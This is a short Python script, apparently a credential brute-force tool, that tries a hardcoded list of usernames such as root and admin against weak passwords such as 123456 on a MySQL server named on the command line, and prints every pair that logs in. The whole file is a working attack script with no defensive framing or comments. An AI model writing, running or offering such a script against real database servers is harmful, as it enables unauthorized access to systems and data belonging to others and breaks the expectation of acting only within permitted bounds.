import sys
import pymysql

def brute_force_sql(host, user_list, pass_list):
    for username in user_list:
        for password in pass_list:
            try:
                conn = pymysql.connect(host=host, user=username, password=password)
                print(f"Success: {username}:{password}")
                conn.close()
            except Exception:
                pass

if __name__ == "__main__":
    host = sys.argv[1]
    user_list = ["root", "admin", "user"]
    pass_list = ["admin", "password", "123456"]
    brute_force_sql(host, user_list, pass_list)
